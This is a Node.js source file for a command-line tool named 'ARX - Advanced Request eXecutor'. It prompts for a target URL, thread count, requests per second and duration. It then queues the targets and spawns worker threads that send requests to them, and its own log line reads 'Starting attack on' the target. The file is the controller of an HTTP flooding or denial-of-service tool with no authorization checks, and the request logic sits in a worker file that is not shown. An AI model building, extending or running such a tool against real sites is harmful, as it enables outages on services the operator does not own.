const readline = require('readline');
const { Worker } = require('worker_threads');
const path = require('path');

let targetQueue = [];
let isRunning = false;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function promptTarget() {
  rl.question('Target URL: ', (url) => {
    rl.question('Threads (default 10): ', (threads) => {
      rl.question('RPS (default 100): ', (rps) => {
        rl.question('Duration in seconds (default 30): ', (duration) => {
          targetQueue.push({
            url,
            threads: parseInt(threads) || 10,
            rps: parseInt(rps) || 100,
            duration: parseInt(duration) || 30
          });
          if (!isRunning) runNextTarget();
        });
      });
    });
  });
}

function runNextTarget() {
  if (targetQueue.length === 0) return;

  const target = targetQueue.shift();
  isRunning = true;
  console.log(`
[INFO] Starting attack on ${target.url} for ${target.duration}s with ${target.threads} threads at ${target.rps} RPS.`);

  let activeThreads = 0;
  for (let i = 0; i < target.threads; i++) {
    const worker = new Worker(path.resolve(__dirname, 'worker.js'), {
      workerData: {
        url: target.url,
        rps: Math.floor(target.rps / target.threads),
        duration: target.duration
      }
    });

    activeThreads++;

    worker.on('message', (msg) => {
      if (msg.done) {
        activeThreads--;
        if (activeThreads === 0) {
          console.log(`[INFO] Completed target: ${target.url}\n`);
          isRunning = false;
          if (targetQueue.length > 0) runNextTarget();
          else promptTarget();
        }
      }
    });

    worker.on('error', (err) => {
      console.error(`[ERROR] Worker error: ${err.message}`);
    });
  }
}

console.log(`
Selamat datang di ARX - Advanced Request eXecutor`);
promptTarget();

rl.on('line', (input) => {
  if (input.trim().toLowerCase() === 'next') {
    promptTarget();
  } else if (input.trim().toLowerCase() === 'stop') {
    console.log('[INFO] Stopping input. Current queue will finish.');
    rl.close();
  }
});
